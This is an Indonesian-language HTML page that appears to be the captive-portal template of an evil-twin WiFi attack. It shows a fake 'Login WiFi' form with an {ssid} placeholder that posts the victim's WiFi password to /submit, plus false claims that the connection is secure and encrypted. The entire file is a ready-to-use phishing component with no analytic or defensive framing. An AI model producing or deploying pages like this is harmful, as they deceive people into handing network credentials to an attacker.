<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="refresh" content="0; url=/connecttest.html">
    <title>Login WiFi - Masukkan Kredensial</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Helvetica Neue', Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 30px 60px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 400px;
        }
        .header {
            background: linear-gradient(135deg, #667eea, #764ba2);
            margin: -40px -40px 30px -40px;
            padding: 30px;
            border-radius: 20px 20px 0 0;
            text-align: center;
        }
        .header h1 {
            color: white;
            font-size: 24px;
        }
        .lock-icon {
            font-size: 50px;
            margin-bottom: 10px;
        }
        .info-box {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            text-align: center;
        }
        .info-box strong {
            color: #764ba2;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            color: #333;
            margin-bottom: 8px;
            font-weight: 600;
        }
        .form-group input {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
        }
        .form-group input:focus {
            border-color: #667eea;
            outline: none;
        }
        .submit-btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
        }
        .submit-btn:hover {
            opacity: 0.9;
        }
        .security {
            margin-top: 20px;
            text-align: center;
            color: #888;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="lock-icon">[SECURE]</div>
            <h1>Login WiFi</h1>
        </div>
        
        <div class="info-box">
            <small>Jaringan:</small><br>
            <strong>{ssid}</strong>
        </div>
        
        <form action="/submit" method="POST">
            <div class="form-group">
                <label>[KEY] Password WiFi</label>
                <input type="password" name="password" placeholder="Masukkan password" required>
            </div>
            
            <button type="submit" class="submit-btn">[ROCKET] Sambungkan</button>
        </form>
        
        <div class="security">
            [LOCK] Koneksi aman dan terenkripsi
        </div>
    </div>
</body>
</html>
